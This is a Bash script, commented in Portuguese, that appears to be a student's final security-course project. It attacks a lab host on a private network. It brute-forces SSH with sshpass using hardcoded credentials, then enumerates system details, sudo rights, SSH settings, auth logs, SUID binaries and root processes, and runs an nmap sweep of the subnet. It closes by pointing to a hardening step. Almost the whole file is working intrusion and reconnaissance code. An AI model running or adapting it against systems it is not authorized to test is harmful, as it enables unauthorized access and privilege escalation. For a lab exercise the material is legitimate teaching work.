#!/bin/bash

# Ataques Reais - Trabalho Final Segurança

TARGET="192.168.3.216"
USER="apolo"
SENHA_CORRETA="123456789"

echo "🔴 ATAQUES REAIS CONTRA O ALVO"
echo "Alvo: $TARGET | Usuário: $USER"
echo "================================"
echo ""

# Verificar conectividade
echo "[0] Verificando conectividade..."
if ! ping -c 1 "$TARGET" >/dev/null 2>&1; then
    echo "❌ ERRO: Alvo $TARGET não responde"
    exit 1
fi
echo "✅ Alvo responde ao ping"
echo ""

# 1. SSH Brute Force (apenas 2 tentativas)
echo "[1] SSH BRUTE FORCE ATTACK"
echo "Testando senhas comuns..."

# Primeira tentativa (falha)
echo -n "  Testando 'admin': "
if sshpass -p "admin" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$USER@$TARGET" "echo 'ACESSO_OBTIDO'" 2>/dev/null | grep -q "ACESSO_OBTIDO"; then
    echo "✅ SUCESSO!"
    SENHA_ENCONTRADA="admin"
else
    echo "❌ Falhou"
fi

# Segunda tentativa (sucesso)
if [ -z "$SENHA_ENCONTRADA" ]; then
    echo -n "  Testando '$SENHA_CORRETA': "
    if sshpass -p "$SENHA_CORRETA" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$USER@$TARGET" "echo 'ACESSO_OBTIDO'" 2>/dev/null | grep -q "ACESSO_OBTIDO"; then
        echo "✅ SUCESSO!"
        SENHA_ENCONTRADA="$SENHA_CORRETA"
    else
        echo "❌ Falhou - Verifique se SSH está funcionando"
        exit 1
    fi
fi

echo "🎯 VULNERABILIDADE CRÍTICA: Senha fraca '$SENHA_ENCONTRADA'"
echo ""

# 2. Enumeração do Sistema
echo "[2] ENUMERAÇÃO DO SISTEMA"
echo "Coletando informações do sistema..."
sshpass -p "$SENHA_CORRETA" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "
echo '=== INFORMAÇÕES DO SISTEMA ==='
uname -a
echo ''
echo '=== USUÁRIO ATUAL ==='
whoami
id
echo ''
echo '=== PRIVILÉGIOS SUDO ==='
sudo -l 2>/dev/null || echo 'Sem acesso sudo ou requer senha'
" 2>/dev/null
echo ""

# 3. Análise de Configuração SSH
echo "[3] ANÁLISE SSH"
echo "Verificando configurações inseguras..."
sshpass -p "$SENHA_CORRETA" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "
echo '=== CONFIGURAÇÃO SSH ==='
grep -E '(Port|PermitRootLogin|PasswordAuthentication)' /etc/ssh/sshd_config 2>/dev/null
" 2>/dev/null
echo ""

# 4. Network Discovery
echo "[4] DESCOBERTA DE REDE"
echo "Escaneando rede local..."
nmap -sn 192.168.3.0/24 2>/dev/null | grep "Nmap scan report" | head -5
echo ""

# 5. Análise de Logs
echo "[5] ANÁLISE DE LOGS"
echo "Verificando logs de segurança..."
sshpass -p "$SENHA_CORRETA" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "
echo '=== LOGS DE AUTENTICAÇÃO ==='
tail -5 /var/log/auth.log 2>/dev/null || echo 'Log não acessível'
echo ''
echo '=== ÚLTIMOS LOGINS ==='
last -5 2>/dev/null || echo 'Histórico não acessível'
" 2>/dev/null
echo ""

# 6. Teste de Escalação de Privilégios
echo "[6] TESTE DE ESCALAÇÃO"
echo "Verificando possibilidades de escalação..."
sshpass -p "$SENHA_CORRETA" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "
echo '=== ARQUIVOS COM SUID ==='
find /usr/bin -perm -4000 2>/dev/null | head -5
echo ''
echo '=== PROCESSOS COMO ROOT ==='
ps aux | grep root | head -3 2>/dev/null
" 2>/dev/null
echo ""

# Resumo Final
echo "================================"
echo "🚨 RESUMO DOS ATAQUES"
echo "================================"
echo "✅ SSH Brute Force: SUCESSO (senha: $SENHA_ENCONTRADA)"
echo "✅ Enumeração: Informações coletadas"
echo "✅ Config SSH: Analisada"
echo "✅ Network Scan: Executado"
echo "✅ Log Analysis: Realizada"
echo "✅ Privilege Check: Executado"
echo ""
echo "🎯 SISTEMA COMPROMETIDO!"
echo "🔧 Execute 'make harden' para aplicar correções"